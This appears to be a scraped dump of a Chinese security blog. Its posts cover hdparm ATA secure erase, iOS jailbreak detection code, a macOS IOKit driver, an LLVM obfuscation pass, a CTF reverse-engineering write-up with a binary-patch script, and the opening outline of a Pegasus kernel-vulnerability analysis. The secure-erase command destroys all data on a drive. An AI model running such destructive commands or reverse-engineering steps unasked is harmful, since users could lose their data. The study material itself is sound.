ENHANCED SECURITY ERASE UNIT. Step 3 - 发送ATA安全擦除命令:time hdparm --user-master u --security-erase Eins /dev/X 等待命令完成,此示例输出显示Intel X25-M 80GB SSD花费大约40秒命令输出： 12345security_password=\"Eins\" /dev/sdd:Issuing SECURITY_ERASE command, password=\"Eins\", user=user0.000u 0.000s 0:39.71 0.0% 0+0k 0+0io 0pf+0w Step 4 - 驱动器已经被擦除， 验证安全性是否禁用:成功擦除后，驱动器安全性应自动设置为禁用（因此不再需要访问密码）。通过运行以下命令验证这一点： hdparm -I /dev/X 命令输出（应显示为禁用）： 123456789Security: Master password revision code = 65534 supported [ not enabled ] not locked not frozen not expired: security count supported: enhanced erase 2min for SECURITY ERASE UNIT. 2min for ENHANCED SECURITY ERASE UNIT. 0x03 参考 http://rick_stone.leanote.com/post/%E8%AF%B4%E8%B5%B7%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E5%92%8C%E5%9B%BA%E6%80%81%E7%A1%AC%E7%9B%98%EF%BC%88%E4%BA%8C%EF%BC%89 http://www.jinbuguo.com/storage/ssd_intro.html https://ata.wiki.kernel.org/index.php/ATA_Secure_Erase","tags":[{"name":"SSD","slug":"SSD","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/SSD/"}]},{"title":"常见iOS越狱检测手段","date":"2017-08-07T10:37:59.000Z","path":"2017/08/07/iOS越狱检测/iOS越狱检测/","text":"iOS越狱检测 如何检测越狱其实就是检测越狱后与非越狱的差异。一句话说明越狱检测原理主要便是检测相关权限，也很容易想到，因为越狱使得权限很大得到了提升。比如某些目录是否能访问，是否安装某些动态库，是否安装某些app等，另外建议对检测的类名及方法名进行混淆，对关键字符串进行加密等手段。 注:以下代码均已在真机上测试完成Demo工程代码地址 1. 使用NSFileManager检测是否安装常见越狱工具注：采用NSFileManager存在可能被hook的情况，最好结合底层stat等函数双重检测 示例代码 123456789101112131415161718192021222324252627/* 常见越狱工具路径：/Library/MobileSubstrate/MobileSubstrate.dylib /Applications/Cydia.app /var/lib/cydia//var/cache/apt /var/lib/apt /etc/apt /bin/bash /bin/sh /usr/sbin/sshd /usr/libexec/ssh-keysign /etc/ssh/sshd_config*/- (BOOL)checkPath&#123; BOOL jailBroken = NO; NSString * aptPath = @\"/private/var/lib/apt\"; if ([[NSFileManager defaultManager] fileExistsAtPath:aptPath]) &#123; jailBroken = YES; &#125; return jailBroken;&#125; 2. 使用stat系列函数检测常用越狱工具示例代码 123456789//头文件 #import &lt;sys/stat.h&gt;//路径同上//使用stat系列函数检测 struct stat stat_info; if (0 == stat(\"/Applications/Cydia.app\", &amp;stat_info)) &#123; jailbroken = YES; &#125; 检测stat是否被替换 1234567891011 int ret; Dl_info dylib_info; int (*func_stat)(const char *,struct stat *) = stat; if ((ret = dladdr(func_stat, &amp;dylib_info))) &#123; if (strcmp(dylib_info.dli_fname,\"/usr/lib/system/libsystem_kernel.dylib\") != 0) &#123; jailbroken = YES; &#125;&#125; 3.检测程序运行的环境变量123456789101112//检测当前程序运行的环境变量，防止通过DYLD_INSERT_LIBRARIES注入链接异常动态库，来更改相关工具名称- (BOOL)checkEnv&#123; char *env = getenv(\"DYLD_INSERT_LIBRARIES\"); NSLog(@\"%s\", env); if (env) &#123; return YES; &#125; return NO;&#125; 4.dylib动态库检测示例代码 1234567891011121314//头文件 #import &lt;mach-o/dyld.h&gt;//几乎所有的越狱机都会安装 Library/MobileSubstrate/MobileSubstrate.dylib动态库 uint32_t count = _dyld_image_count(); for (uint32_t i = 0 ; i &lt; count; ++i) &#123; NSString *name = [[NSString alloc]initWithUTF8String:_dyld_get_image_name(i)]; if ([name containsString:@\"Library/MobileSubstrate/MobileSubstrate.dylib\"]) &#123; jailbroken = YES; &#125; &#125; 参考 http://www.jianshu.com/p/a43be50dc958 http://www.freebuf.com/articles/wireless/6318.html http://www.jianshu.com/p/f664b1da8458 http://www.jianshu.com/p/f220e63319eb","tags":[{"name":"iOS应用安全","slug":"iOS应用安全","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iOS应用安全/"}]},{"title":"内核扩展-驱动开发实例","date":"2017-08-03T11:27:59.000Z","path":"2017/08/03/内核扩展-驱动开发实例/内核扩展-驱动开发实例/","text":"结合《OS X 内核编程》以及网上相关的学习，用一个例子来说明自己对macOS IOkit的理解 0x00 一点概念操作系统可以理解成硬件的抽象或者说提供服务，如下图所示，在xnu内核之中，由mach微内核，IOKit，BSD三大组件构成。作为内核的一部分IOKit起着想当重要的作用，抽象IO设备，采用C++编写的IOKit框架使得硬件驱动具有模块化，便于扩展。程序难免会和相应的硬件交互，苹果定义了IOKit.framework，这个框架定义了一些与公共的接口，可以让用户层通过这些接口与一些标准的驱动程序进行交互。而驱动与用户程序之间到底是如何交互的？本篇就来分析其中的细节。 0x01 驱动加载的过程当硬件插入电脑时，系统会根据硬件的类型创建一个Provider(提供者)的对象，并且这个Provider会在初使化的过程中去尝试匹配合适的驱动程序，如上图，我们开发一款适合于PCI声卡或USB音频设备的驱动程序，首先硬件载入后会去查找驱动程序Info.plist中的IOKitPersonalities的信息，如果IOProviderClass中定义了IOPCIDriver就表示可以为PCI做匹配，如果同时也有IOUSBDriver项就表示USB的设备也可以做匹配，同时如果有多个支持PCI或USB的驱动出现时，就会去调用驱动程序的probe方法，最终找到匹配度最高的驱动程序进行加载(实际的原理会更复杂)，然后该驱动程序就可以通过不同的Provider与硬件通信，并且通过标准的IOAudioDriver接口为系统提供音频的服务，从而用户程序就可以通过系统的标准方法最终让音频设备工作。 0x02 创建驱动程序打开Xcode，选择IOKit Driver模板，取名工程名IOKitTest，然后可以在工程中看到会自动创建两个文件，分别是IOKitTest.h和IOKitTest.cpp，但非常遗憾的是，模板并没有为我们在这两个文件中生成任何的内容。我们手动在IOKitTest.h中输入以下内容： 12345678910111213141516171819#include &lt;IOKit/IOService.h&gt;class com_osxkernel_driver_IOKitTest : public IOService &#123; //一个宏定义，会自动生成该类的构造方法、析构方法和运行时 OSDeclareDefaultStructors(com_osxkernel_driver_IOKitTest) public: //该方法与Cocoa中的init和C++中的构造方法类似 virtual bool init(OSDictionary* dictionary = NULL); //该方法与Cocoa中的dealloc和C++中的析构方法类似 virtual void free(void); //进行驱动匹配时调用 virtual IOService* probe(IOService* provider, SInt32* score); //当匹配成功后加载驱动 virtual bool start(IOService *provider); //当硬件移除时或卸载驱动 virtual void stop(IOService *provider);&#125;; 在IOKitTest.cpp中输入以下的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include \"IOKitTest.h\"#include &lt;IOKit/IOLib.h&gt;//让你拥有Cocoa中的super关键字一样的体验#define super IOService//和头文件中的宏定义类似，自动生成一些特定代码OSDefineMetaClassAndStructors(com_osxkernel_driver_IOKitTest, IOService)//该方法打印出dict的内容bool com_osxkernel_driver_IOKitTest::init(OSDictionary *dict)&#123; bool res = super::init(dict); IOLog(\"IOKitTest::init abcd\\n\"); OSCollectionIterator *iter = OSCollectionIterator::withCollection(dict); if (iter) &#123; OSObject *object = NULL; while ((object = iter-&gt;getNextObject())) &#123; OSSymbol *key = OSDynamicCast(OSSymbol, object); IOLog(\"key:%s \",key-&gt;getCStringNoCopy()); OSString *value = OSDynamicCast(OSString, dict-&gt;getObject(key)); if (value != NULL) &#123; IOLog(\"value:%s\\n\",value-&gt;getCStringNoCopy()); &#125; &#125; &#125; return res;&#125;void com_osxkernel_driver_IOKitTest::free(void)&#123; IOLog(\"IOKitTest::free\\n\"); super::free();&#125;IOService* com_osxkernel_driver_IOKitTest::probe(IOService* provider, SInt32* score)&#123; IOService *res = super::probe(provider, score); IOLog(\"IOKitTest::probe\\n\"); return res;&#125;bool com_osxkernel_driver_IOKitTest::start(IOService *provider)&#123; bool res = super::start(provider); IOLog(\"IOKitTest::start\\n\"); //只有调用了此方法，应用层才可以连接该驱动 registerService(); return res;&#125;void com_osxkernel_driver_IOKitTest::stop(IOService *provider)&#123; IOLog(\"IOKitTest::stop\\n\"); super::stop(provider);&#125;","tags":[{"name":"kext","slug":"kext","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/kext/"}]},{"title":"获取macOS序列号UUID等","date":"2017-08-01T08:50:59.000Z","path":"2017/08/01/获取macOS序列号UUID等/获取macOS序列号UUID等/","text":"记录下，可能会用到 12345678910111213141516171819202122232425262728293031323334353637383940414243+ (NSString *)serialNumber &#123; io_service_t platformExpert = IOServiceGetMatchingService( kIOMasterPortDefault, IOServiceMatching(&quot;IOPlatformExpertDevice&quot;)); if (!platformExpert) return nil; NSString *serial = CFBridgingRelease(IORegistryEntryCreateCFProperty( platformExpert, CFSTR(kIOPlatformSerialNumberKey), kCFAllocatorDefault, 0)); IOObjectRelease(platformExpert); return serial;&#125;+ (NSString *)hardwareUUID &#123; io_service_t platformExpert = IOServiceGetMatchingService( kIOMasterPortDefault, IOServiceMatching(&quot;IOPlatformExpertDevice&quot;)); if (!platformExpert) return nil; NSString *uuid = CFBridgingRelease(IORegistryEntryCreateCFProperty( platformExpert, CFSTR(kIOPlatformUUIDKey), kCFAllocatorDefault, 0)); IOObjectRelease(platformExpert); return uuid;&#125;+ (NSString *)osVersion &#123; return [SNTSystemInfo _systemVersionDictionary][@&quot;ProductVersion&quot;];&#125;+ (NSString *)osBuild &#123; return [SNTSystemInfo _systemVersionDictionary][@&quot;ProductBuildVersion&quot;];&#125;+ (NSString *)shortHostname &#123; return [[[SNTSystemInfo longHostname] componentsSeparatedByString:@&quot;.&quot;] firstObject];&#125;+ (NSString *)longHostname &#123; char hostname[MAXHOSTNAMELEN]; gethostname(hostname, (int)sizeof(hostname)); return @(hostname);&#125; 输出： 12serialnum:C02R****FVH5UUID:9C090ED8-****-540B-****-0C186E98FDFE 忽略一些警告的标识123456789101112131415#pragma clang diagnostic push#pragma clang diagnostic ignored \"警告名称\"￼// 被夹在这中间的代码针对于此警告都会忽视不显示出来//常见警告的名称//1.声明变量未使用 \"-Wunused-variable\"//2.方法定义未实现 \"-Wincomplete-implementation\"//3.未声明的选择器 \"-Wundeclared-selector\"//4.参数格式不匹配 \"-Wformat\"//5.废弃掉的方法 \"-Wdeprecated-declarations\"//6.不会执行的代码 \"-Wunreachable-code\"//7.忽略在arc 环境下performSelector产生的 leaks 的警告 \"-Warc-performSelector-leaks\"#pragma clang diagnostic pop","tags":[{"name":"macOS","slug":"macOS","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/macOS/"}]},{"title":"遍历自身加载的dylib获取载入地址和ASLR地址","date":"2017-08-01T08:27:59.000Z","path":"2017/08/01/遍历自身加载的dylib获取载入地址和ASLR地址等/遍历自身加载的dylib获取载入地址和ASLR地址等/","text":"通过macho/dyld.h提供的函数，程序可以获取到自身加载的dylib信息，这里做个简单记录 12345678910111213141516171819#include&lt;stdio.h&gt;#include &lt;mach-o/dyld.h&gt;void getDylibInfo()&#123; printf(\"*****Created by 4ch12dy*****\\nDyld image count is: %d.\\n\", _dyld_image_count()); for (int i = 0; i &lt; _dyld_image_count(); i++) &#123; char *image_name = (char *)_dyld_get_image_name(i); const struct mach_header *mh = _dyld_get_image_header(i); intptr_t vmaddr_slide = _dyld_get_image_vmaddr_slide(i); printf(\"Image name %s at address 0x%llx and ASLR slide 0x%lx.\\n\", image_name, (mach_vm_address_t)mh, vmaddr_slide); &#125;&#125;int main(int argc, char *argv[]) &#123; getDylibInfo(); &#125; 输出： 12345678910111213141516171819202122232425262728293031323334353637383940414243*****Created by 4ch12dy***** Dyld image count is: 41. Image name /Users/king/Desktop/./dylibinfo at address 0x106a5c000 and ASLR slide 0x6a5c000. Image name /usr/lib/libSystem.B.dylib at address 0x7fff8a0e2000 and ASLR slide 0x991c000. Image name /usr/lib/system/libcache.dylib at address 0x7fff89c95000 and ASLR slide 0x991c000. Image name /usr/lib/system/libcommonCrypto.dylib at address 0x7fff8fc8d000 and ASLR slide 0x991c000. Image name /usr/lib/system/libcompiler_rt.dylib at address 0x7fff95695000 and ASLR slide 0x991c000. Image name /usr/lib/system/libcopyfile.dylib at address 0x7fff911fd000 and ASLR slide 0x991c000. Image name /usr/lib/system/libcorecrypto.dylib at address 0x7fff8ebd2000 and ASLR slide 0x991c000. Image name /usr/lib/system/libdispatch.dylib at address 0x7fff8fd49000 and ASLR slide 0x991c000. Image name /usr/lib/system/libdyld.dylib at address 0x7fff97fcc000 and ASLR slide 0x991c000. Image name /usr/lib/system/libkeymgr.dylib at address 0x7fff8a8dd000 and ASLR slide 0x991c000. Image name /usr/lib/system/liblaunch.dylib at address 0x7fff925b2000 and ASLR slide 0x991c000. Image name /usr/lib/system/libmacho.dylib at address 0x7fff9e2af000 and ASLR slide 0x991c000. Image name /usr/lib/system/libquarantine.dylib at address 0x7fff9673a000 and ASLR slide 0x991c000. Image name /usr/lib/system/libremovefile.dylib at address 0x7fff93a7f000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_asl.dylib at address 0x7fff9252f000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_blocks.dylib at address 0x7fff9354c000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_c.dylib at address 0x7fff954f7000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_configuration.dylib at address 0x7fff90772000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_coreservices.dylib at address 0x7fff8ca80000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_coretls.dylib at address 0x7fff934e8000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_dnssd.dylib at address 0x7fff917b2000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_info.dylib at address 0x7fff921dc000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_kernel.dylib at address 0x7fff962e9000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_m.dylib at address 0x7fff9ea96000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_malloc.dylib at address 0x7fff9c890000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_network.dylib at address 0x7fff8c945000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_networkextension.dylib at address 0x7fff91223000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_notify.dylib at address 0x7fff97081000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_platform.dylib at address 0x7fff8fb26000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_pthread.dylib at address 0x7fff971ba000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_sandbox.dylib at address 0x7fffa00c8000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_secinit.dylib at address 0x7fff93708000 and ASLR slide 0x991c000. Image name /usr/lib/system/libsystem_trace.dylib at address 0x7fff9a886000 and ASLR slide 0x991c000. Image name /usr/lib/system/libunc.dylib at address 0x7fff93f3e000 and ASLR slide 0x991c000. Image name /usr/lib/system/libunwind.dylib at address 0x7fff9fcd4000 and ASLR slide 0x991c000. Image name /usr/lib/system/libxpc.dylib at address 0x7fff9abfe000 and ASLR slide 0x991c000. Image name /usr/lib/libobjc.A.dylib at address 0x7fff8deaa000 and ASLR slide 0x991c000. Image name /usr/lib/libauto.dylib at address 0x7fff9feb1000 and ASLR slide 0x991c000. Image name /usr/lib/libc++abi.dylib at address 0x7fff90b13000 and ASLR slide 0x991c000. Image name /usr/lib/libc++.1.dylib at address 0x7fff97f75000 and ASLR slide 0x991c000. Image name /usr/lib/libDiagnosticMessagesClient.dylib at address 0x7fff99766000 and ASLR slide 0x991c000.","tags":[{"name":"dyld","slug":"dyld","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/dyld/"},{"name":"macho","slug":"macho","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/macho/"}]},{"title":"初-LLVM的代码混淆","date":"2017-06-25T07:09:13.000Z","path":"2017/06/25/初-LLVM的代码混淆/初-LLVM的代码混淆/","text":"0x00 目录 断断续续的学习了一段时间的LLVM，记录下学习进度，随着后面的学习待更新 LLVM简介 一个基于LLVM简单的代码混淆例子 参考链接 0x01 LLVM简介LLVM(low level virtual machine)是一个先进的编译器框架，它提供了一种代码编写良好的中间表示(IR)，可以作为多种语言的后端，还可以提供与变成语言无关的优化和针对多种cpu的代码生成功能。LLVM的主要架构如下： 前端：前端用来获取源代码然后将它转变为某种中间表示，我们可以选择不同的编译器来作为LLVM的前端，如gcc，clang。 Pass：Pass是LLVM优化工作的一个节点，一个节点做些事，一起加起来就构成了LLVM完整的优化和转化。 后端：后端用来生成实际的机器码，一般情况下不会关注这一部分。 LLVM框架：这里与传统的编译器不同，LLVM采用了一种统一的中间表示： 安装与使用首先下载LLVM 12$ cd where-you-want-llvm-to-live$ svn co http://llvm.org/svn/llvm-project/llvm/trunk llvm 我们选择clang作为LLVM前端，然后下载clang 123$ cd where-you-want-llvm-to-live$ cd llvm/tools$ svn co http://llvm.org/svn/llvm-project/cfe/trunk clang 下载编译运行库 123$ cd where-you-want-llvm-to-live$ cd llvm/projects$ svn co http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt 最后编译LLVM源码 1234$ mkdir build$ cd build$ cmake -DCMAKE_BUILD_TYPE:String=Release ../llvm/$ make 编译时间可能有点长，编译完成之后进行安装 1$sudo make install 接下来就是LLVM的使用，先创建一个hello.c源文件 12345#include &lt;stdio.h&gt;int main()&#123; printf(\"hello LLVM\\n\"); return 0;&#125; 0x02 一个基于LLVM简单的代码混淆例子Pass是LLVM中一个很重要的部分，每个Pass都是做优化或者转换的工作，LLVM的优化和转换工作就是由很多个Pass一起完成的。我们通过继承指定的类以及实现相关的虚函数来实现具体的Pass，具体的类型主要有以下几种： ImmutablePass MoudlePass CallGraphSCCPass FuncationPass LoopPass RegionPass BasicBlockPass MachineFunctionPass 下面这个例子来介绍一下pass的编写并达到简单的混淆。从这里下载这个模板llvm-pass-skeleton 下面是完整代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include \"llvm/Pass.h\"#include \"llvm/IR/Function.h\"#include \"llvm/Support/raw_ostream.h\"#include \"llvm/IR/LegacyPassManager.h\"#include \"llvm/Transforms/IPO/PassManagerBuilder.h\"#include \"llvm/IR/Intrinsics.h\"#include \"llvm/IR/Instructions.h\"using namespace llvm;namespace &#123; struct SkeletonPass : public FunctionPass &#123; static char ID; SkeletonPass() : FunctionPass(ID) &#123;&#125; // virtual bool runOnFunction(Function &amp;F) &#123; // errs() &lt;&lt; \"I saw a function called \" &lt;&lt; F.getName() &lt;&lt; \"!\\n\"; // return false; // &#125; bool runOnFunction(Function &amp;F) override &#123; Function *tmp = &amp;F; // 遍历函数中的所有基本块 for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) &#123; // 遍历基本块中的每条指令 for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) &#123; // 是否是add指令 if (inst-&gt;isBinaryOp()) &#123; if (inst-&gt;getOpcode() == Instruction::Add) &#123; ob_add(cast&lt;BinaryOperator&gt;(inst)); &#125; &#125; &#125; &#125; return false; &#125; // a+b === a-(-b) bool ob_add(BinaryOperator *bo) &#123; BinaryOperator *op = NULL; if (bo-&gt;getOpcode() == Instruction::Add) &#123; // 生成 (－b) op = BinaryOperator::CreateNeg(bo-&gt;getOperand(1), \"\", bo); // 生成 a-(-b) op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(0), op, \"\", bo); op-&gt;setHasNoSignedWrap(bo-&gt;hasNoSignedWrap()); op-&gt;setHasNoUnsignedWrap(bo-&gt;hasNoUnsignedWrap()); &#125; // 替换所有出现该指令的地方 bo-&gt;replaceAllUsesWith(op); &#125; &#125;;&#125;char SkeletonPass::ID = 0;// Automatically enable the pass.// http://adriansampson.net/blog/clangpass.htmlstatic void registerSkeletonPass(const PassManagerBuilder &amp;, legacy::PassManagerBase &amp;PM) &#123; PM.add(new SkeletonPass());&#125;static RegisterStandardPasses RegisterMyPass(PassManagerBuilder::EP_EarlyAsPossible, registerSkeletonPass); 通过继承FunctionPass重写虚函数runOnFunction来到达我们代码混淆的目的，再看关键的混淆部分，如下面注释那样，找到函数中的add指令，并将其改为sub指令。如a+b经过混淆为a-(-b) 1234567891011121314151617bool runOnFunction(Function &amp;F) override &#123; Function *tmp = &amp;F; // 遍历函数中的所有基本块 for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) &#123; // 遍历基本块中的每条指令 for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) &#123; // 是否是add指令 if (inst-&gt;isBinaryOp()) &#123; if (inst-&gt;getOpcode() == Instruction::Add) &#123; ob_add(cast&lt;BinaryOperator&gt;(inst)); &#125; &#125; &#125; &#125; return false; &#125; 代码很简单，这里就不多说。我们使用 1$clang -Xclang -load -Xclang build/skeleton/libSkeletonPass.* something.c 来运行这个pass编译成目标可执行文件现在我们创建一个addTest.c文件来测试是否代码混淆 1234567891011121314#include &lt;stdio.h&gt;int func(int a,int b)&#123; return a + b;&#125;int main()&#123; int c; c = func(6,9); printf(\"%d\\n\",c); return c;&#125; 先按照一般的编译源代码，查看关键汇编代码：然后运行我们的pass进行编译很明显，汇编代码发生了改变，当然这里仅仅是一个简单的混淆，感兴趣的可以研究下obfuscator-llvm这个项目。 0x03 参考链接深入剖析 iOS 编译 Clang / LLVMhttp://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/","tags":[{"name":"llvm","slug":"llvm","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/llvm/"},{"name":"obfuscation","slug":"obfuscation","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/obfuscation/"}]},{"title":"pwnhub-CTF re150","date":"2017-05-28T01:16:13.000Z","path":"2017/05/28/pwnhub-CTF-re150/pwnhub-CTF-re150/","text":"0x00 写在前面第一次做pwnhub题，最近参加了几场ctf比赛，pwnhub的题还是比较有一定难度的，这里记录下其中的一道逆向题。题目在这里 0x01 简单分析拿到题目后试着在虚拟机里运行了一下，看下有什么提示 然后转去hopper搜下相关字符串，并没有发现error相关字符串，syclover也没有相关printf等函数输出，看来只能上gdb调试看看。 发现程序里面有多处花指令以及隐藏了程序入口。 由上图可以发现syclover直接由int 0x80系统调用中断输出到屏幕，下面是一个循环解密，后面可知解密的正是程序的入口。 由__libc_start_main函数可得第一个参数即为main函数地址这里作为对比，可以看下hopper中对0x8048320main函数的解析完全不知道是什么有木有？所以拿到题如果放到IDA之类的反汇编工具根本看不出什么线索 接下来所做的事就是获取输入的字符串然后进行加密，然后与程序里的字符串加密比较，具体看后面的代码。 0x02 修复程序根据上面的分析，我们将程序进行修复 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;assert.h&gt;#include &lt;elf.h&gt;#define ENTRY 0x08048320#define FILE_OFF 0x320#define COUNT 0x432int main(int argc,char *argv[])&#123; Elf32_Ehdr ehdr; unsigned char buf[COUNT] = &#123;0&#125;; assert(argc == 2); int fd = open(argv[1],O_RDWR);//打开文件 assert(fd&gt;0); assert(lseek(fd,0,SEEK_SET)!=-1);// 读取elf头 assert(read(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr)); ehdr.e_entry = ENTRY;//修改入口地址 assert(lseek(fd,0,SEEK_SET)!=-1);//回写elf头 assert(write(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr)); //解密 assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//读取被加密的代码 assert(read(fd,buf,COUNT) == COUNT); int i = 0; while(i&lt;COUNT)&#123; buf[i] = (buf[i]^66)&lt;&lt;5 | (buf[i]^66)&gt;&gt;3; i++; &#125; assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//写入正确代码 assert(write(fd,buf,COUNT) == COUNT); 0x03 分析算法计算flag123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/python# -*- coding: UTF-8 -*-from __future__ import print_function import sysdef getflag(): print(\"[i]start to encrypt key\") key = [0x73,0x8d,0xf2,0x4c,0xc7,0xd4,0x7b,0xf7,0x18,0x32,0x71,0x0d,0xcf,0xdc,0x67,0x4f,0x7f,0x0b,0x6d] encryptKey = [] print(\"encryptKey=[\", end=\"\") for idx in range(len(key)): encryptKey.append(key[idx] ^ 0x20) print(\"%x \" % encryptKey[idx], end=\"\") print(\"]\") flag = [] print(\"[i]find the flag\") for i in range(len(encryptKey)): count = 0x00 while(count &lt;= 0x7f): one = count &gt;&gt; (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d)) two = count &lt;&lt; (0x8 - (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d))) if((((one | two) ^ i) &amp; 0xff) == encryptKey[i]): flag.append(count) break count = count + 1 print(\"flag = \",end=\"\") for i in range(len(flag)): print(\"%c\" % flag[i], end=\"\") if __name__ == '__main__': key = getflag() 最后运行程序得到flag 1234[i]start to encrypt keyencryptKey=[53 ad d2 6c e7 f4 5b d7 38 12 51 2d ef fc 47 6f 5f 2b 4d ][i]find the flagflag = SYC&#123;&gt;&gt;Wh06m1&gt;&gt;R0Ot&#125; 测试：","tags":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CTF/"},{"name":"writeup","slug":"writeup","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/writeup/"}]},{"title":"一道高中数学题的思考？","date":"2017-05-04T12:37:59.000Z","path":"2017/05/04/math/math/","text":"0x00 写在前面 突然在邮件中收到Quora中这样一个问题”What does X equal in $\\sqrt{x+15} + \\sqrt{x} = 15$? “ 凭着曾经对数学的热爱，我点了进去。顺便学习了点知识。 0x01 你会怎么解决？不得不承认，这种题型在初高中时候还是蛮常见的，在我的脑海里，也别无他法，一步一步去根号解方程吧。但都知道，同时平方带来就是可能会升高次数，有时候拿到答案还是挺繁琐的，至少计算上来说是这样的。 0x02 方法1 平方法通常解决这个问题的方法是将方程的两边平方并简化，并保持平方，直到方程中没有平方根 $\\sqrt{x+15} + \\sqrt{x} = 15$ $(\\sqrt{x+15} + \\sqrt{x})^2 = 15^2$ $x+15 + 2\\sqrt{(x+15)x} + x = 225$ $2\\sqrt{(x+15)x} = 210 - 2x$ $\\sqrt{(x+15)x} = 105 - x$ $(\\sqrt{(x+15)x})^2 = (105 - x)^2$ $x^2 + 15x = 11025 - 210x +x^2$ $225x = 11025$ $ x = 49$思维过程很清楚，但明显计算上有点繁琐。 0x03 方法2 拼凑法不一定可靠，但一定最快。大多情况下，都是开方后是整数。所以每个完全平方数的序列（$1^22^23^3…6^27^28^2… =&gt; 1 4 9 16 25 36 49 64 …$） 哪两个数相差15呢？很明显64 - 49 = 15，也许你觉得这很不靠谱，其实至少对于开方是整数的结果来说是很快的，觉得慢主要是你还不熟练。因为并不是一个一个的去试验，因为相邻之差是递增且快。类似二叉树来查找会很快得出结果。 $\\sqrt{49 + 15} + \\sqrt{49} = 15$ $7 + 8 = 15$最快，但不一定可靠。 0x04 方法3 平方差法暂且称作平方差法吧，这个方法是我最推荐的，既快又准。原式：$\\sqrt{x+15} + \\sqrt{x} = 15$ (1) 设 $\\sqrt{x+15} - \\sqrt{x} = k$ 又 $(\\sqrt{x+15} - \\sqrt{x})(\\sqrt{x+15} + \\sqrt{x})= 15k$ 解得： $k = 1$ 所以 $\\sqrt{x+15} - \\sqrt{x} = 1$ （2） 然后（1）+ (2): $2\\sqrt{x+15} = 16$ 解得: $x = 49$ 多么棒的一个方法 I love it！ 0x05 我与数学从小数学就比语文好的我，数学确实给了我很多自信，想破头皮的去思考一个一个的题。一如既往的热爱，以致于高考只填了一个专业–数学。由于种种原因，没能选上，去来到了计算机相关的专业。计算机科学同样是一个迷人的世界，那种理解本质，控制计算机的运行是让人着迷的。在反馈上来说，计算机比做数学得到的反馈更真实，快速。做数学题的时候总是找不到方向，得到的反馈少且慢，容易让人沮丧，想必这也是大多人讨厌数学的原因之一吧。虽然现在更热爱计算机，但心底里仍然有一个数学的种子。以至于很多时候看到感兴趣的题也会拿上纸笔算一算，知乎上也关注了相关话题，还有一个自己特别骄傲的回答，关于高中数列的，具体情况移步高考数学数列放缩总结技巧有哪些？相信不管是现在还是将来，数学都是我最深处的支持。","tags":[{"name":"数学","slug":"数学","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/数学/"}]},{"title":"Pegasus内核漏洞及PoC分析","date":"2017-05-01T06:52:45.000Z","path":"2017/05/01/Pegasus内核漏洞及PoC分析/Pegasus内核漏洞及PoC分析/","text":"0x00 写在前面 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google 1.iOS“远程越狱”间谍软件Pegasus技术分析 2.iOS三叉戟漏洞补丁分析、利用代码 公布（POC 3.Pegasus – 针对iOS设备的APT攻击分析 0x01 目录 OSUnserializeBinary概述 漏洞分析-CVE-2016-4655，CVE-2016-4656 漏洞利用-PoC分析 总结 0x02 OSUnserializeBinary概述 